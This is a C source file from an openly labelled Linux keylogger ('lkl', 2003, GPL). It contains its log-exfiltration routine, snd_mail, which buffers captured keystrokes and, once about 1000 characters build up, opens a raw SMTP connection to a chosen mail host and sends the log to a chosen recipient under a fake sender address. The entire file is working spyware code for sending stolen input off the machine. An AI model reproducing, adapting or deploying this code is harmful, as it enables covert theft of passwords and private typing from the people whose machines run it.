/*
    LinuxKeyLogger, lkl is a keylogger for x86-arch running under linux.
    Developed by vl4d

    Copyright (C) 2003  Carlo Comin

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/

#include "lkl.h"

#define CMDNUM 6
#define LOGBUF 1000

static char logbuf[1024];
char *mail[CMDNUM] = {"HELO tin.it\n",
		      "MAIL FROM:lkl@lkl.log.your.linux.box.com\n",
		      "RCPT TO:",
		      "DATA\n",
		      ".\n",
		      "QUIT\n"};

void snd_mail(char ascii[], char host[], char rcpt[])
{
	int fd, i, j;
	struct sockaddr_in sock;
  
	strcat(logbuf, ascii);
  
	if(strlen(logbuf) >= LOGBUF){

		printf("\n\nsending logs to %s via %s\n\n", rcpt, host);
    
		sock.sin_family = AF_INET;
		sock.sin_addr.s_addr = inet_addr(host);
		sock.sin_port = htons(25);
		memset(&sock.sin_zero, '\0', 8);
    
		if((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1){
			perror("socket");
			return;
		}
    
		if(connect(fd, (struct sockaddr *)&sock, sizeof(struct sockaddr)) == -1){
			printf("\n\nunable to connect to %s\n", (char *)inet_ntoa(sock.sin_addr));
			perror("connect()");
			puts("\n");
			return;
		}
    
		for(i = 0; i <= (CMDNUM-1); i++){
			send(fd, mail[i], strlen(mail[i]), 0);
			if(i == 2){
				send(fd, rcpt, strlen(rcpt), 0);
				send(fd, "\n", sizeof(char), 0);
			}
			if(i == 3){
				send(fd, logbuf, strlen(logbuf), 0);
				send(fd, "\n", sizeof(char), 0);
			}
		}
  
		close(fd);
		bzero(logbuf, strlen(logbuf));
	}
}
